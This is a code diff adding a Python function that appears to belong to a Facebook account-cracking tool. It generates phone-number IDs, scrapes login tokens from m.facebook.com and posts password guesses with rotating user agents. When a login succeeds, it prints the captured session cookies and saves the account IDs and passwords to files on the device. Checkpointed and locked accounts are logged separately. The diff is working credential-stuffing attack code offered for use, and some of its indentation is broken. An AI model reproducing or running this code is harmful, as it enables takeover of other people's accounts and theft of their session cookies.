@@ -379,3 +379,150 @@ def Tabii():
         print(f'{GREEN}===========================================================')
 
         for love in user:
+        uid = code+love
+
+            pwx = [love]
+
+            yaari.submit(free,uid,pwx,tl)
+
+def free(uid,pwx,tl):
+
+    global loop
+
+    global oks
+
+    global agents
+
+    try:
+
+        for ps in pwx:
+
+            bi = random.choice([A])
+
+            session = requests.Session()
+
+            pro = random.choice(ugen)
+
+            free_fb = session.get('https://m.facebook.com').text
+
+            log_data = {
+
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+
+            "try_number":"0",
+
+            "unrecognized_tries":"0",
+
+            "email":uid,
+
+            "pass":ps,
+
+            "login":"Log In"}
+
+            header_freefb = {'authority':'m.facebook.com',
+
+            'method': 'POST',
+
+            'scheme': 'https',
+
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+
+            'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9',
+
+            'cache-control': 'max-age=0',
+
+            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
+
+            'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
+
+            'sec-fetch-dest': 'document',
+
+            'sec-fetch-mode': 'navigate',
+
+            'sec-fetch-site': 'none',
+
+            'sec-fetch-user': '?1',
+
+            'upgrade-insecure-requests': '1',
+
+            'user-agent':pro}
+
+            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
+
+            log_cookies=session.cookies.get_dict().keys()
+
+            if 'c_user' in log_cookies:
+
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+
+                cid = coki[7:22]
+
+                print('\r\033[1;32m[√]---------------------[ALONE-OK]--------------------[√]\nNUMBER : '+uid+'\nUID   : '+cid+' √ '+ps+ '\nCOOKIE   : '+coki+'\n[√]---------------------------------------------------[√]')
+
+                cek_apk(session,coki)
+
+                open('/sdcard/ALONE-OK.txt', 'a').write(cid+' | '+ps+'\n')
+
+                oks.append(cid)
+
+                break
+
+            elif 'checkpoint' in log_cookies:
+
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+
+                cid=coki[24:39]
+
+                Red = '\033[1;31m'
+
+                print(f'\r{Red}[×]--------------------[ALONE-CP]---------------------[×]\nNUMBER : '+uid+'\nUID   : '+cid+' √ '+ps+ '\n[×]---------------------------------------------------[×]\033[1;97m')
+
+                open('/sdcard/ALONE-CP.txt', 'a').write(cid+' | '+ps+'\n')
+
+                cps.append(cid)
+
+                break
+
+            elif '/x/checkpoint' in log_cookies:
+
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+
+                cid=coki[7:22]
+
+                Red = '\033[1;31m'
+
+                print(f'\r{YELLOW}[TEMP-LOCK] '+cid+' | '+ps+'\033[1;97m')
+
+                open('/sdcard/ALONE-2F.txt', 'a').write(cid+' | '+ps+'\n')
+
+                twf.append(cid)
+
+            else:
+
+                continue
+
+        loop+=1
+
+        sys.stdout.write(f'\r\33[1;37m[ALONE ] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
+
+        sys.stdout.flush()
+
+        checks(oks,cps,twf)
+
+    except:
+
+        pass
+
+        
+
+ 
+
+if __name__ == '__main__':
+
+    xyz()
